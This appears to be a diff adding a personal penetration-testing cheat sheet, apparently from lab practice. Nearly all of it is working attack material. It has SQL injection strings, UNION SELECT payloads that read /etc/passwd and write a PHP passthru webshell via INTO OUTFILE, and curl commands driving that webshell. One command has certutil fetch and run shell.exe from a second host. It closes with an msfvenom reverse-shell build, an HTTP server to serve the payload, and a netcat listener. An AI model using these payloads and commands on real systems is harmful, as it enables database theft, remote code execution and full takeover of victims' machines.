@@ -1,0 +1,43 @@
+=================================== 
+SQL Injection 
+
+' 
+" 
+; 
+admin' -- 
+' OR 1=1 -- 
+" OR 1=1 --  
+' OR 1=1;# 
+" OR 1=1 #  
+',convert(int@@version))-- 
+
+=================================== 
+PHP SQLi Parameter "?"
+
+View Page Source > Ctrl-F "?"  
+http://192.168.200.5/room.php?cod=1'
+Error/no-graphic = We have injection
+
+=================================== 
+PHP Webshell
+
+' AND 1=2 UNION SELECT database(),user(),version() -- 
+' AND 1=2 UNION SELECT database(),user() -- 
+' AND 1=2 UNION SELECT database() -- 
+' AND 1=2 UNION SELECT "/etc/passwd","b","c"--' 
+' UNION SELECT ("test") INTO OUTFILE 'C:/xampp/htdocs/test.php'  -- -' 
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -' 
+
+Webshell 
+curl "http://192.168.200.5:8080/cmd.php?cmd=whoami" 
+curl "http://192.168.200.5:8080/cmd.php?cmd=dir" 
+curl "http://192.168.200.5:8080/cmd.php?cmd=certutil -f -urlcache http://192.168.162.46:80/shell.exe 
+curl "http://192.168.200.5:8080/cmd.php?cmd=shell.exe"
+
+Webshell to Reverse 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=53 -f exe -o reverse.exe       
+python3 -m http.server 80 
+nc -lvnp 53
+
+=================================== 
+Consider: mxweb mxcurls
